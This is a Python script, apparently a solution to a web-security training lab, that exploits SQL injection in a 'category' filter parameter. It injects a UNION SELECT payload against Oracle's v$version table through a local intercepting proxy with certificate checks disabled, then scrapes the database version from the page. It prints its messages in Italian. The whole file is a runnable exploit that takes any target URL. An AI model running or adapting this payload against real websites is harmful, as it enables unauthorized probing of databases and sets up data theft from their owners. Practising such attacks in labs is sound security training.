import requests
import sys
import urllib3
import re
from bs4 import BeautifulSoup
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


proxies = {'http' : 'http://127.0.0.1:8080' , 'https' : 'http://127.0.0.1:8080'}


def exploit_sqli_version(url):
    uri = "/filter?category=Gifts"
    sql_payload = "' UNION SELECT banner,NULL FROM v$version--"
    r = requests.get(url + uri + sql_payload, verify=False, proxies=proxies)
    response = r.text
    if "Oracle Database" in response:
        print("[+] Versione del database individuato.")
        soup = BeautifulSoup(response,'html.parser')
        version = soup.find(string=re.compile(r'.*Oracle\sDatabase.*'))
        print("[+] La versione del database Oracle è: " + version)
        return True
    return False


if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()

    except IndexError:
        print("[-] Utilizzo: %s <url> " % sys.argv[0])
        print("[-] Esempio: %s www.example.com" % sys.argv[0])
        sys.exit()

    print("[+] Recuperando la versione del database...")


    if not exploit_sqli_version(url):
        print("[+] Impossibile individuare la versione del database" )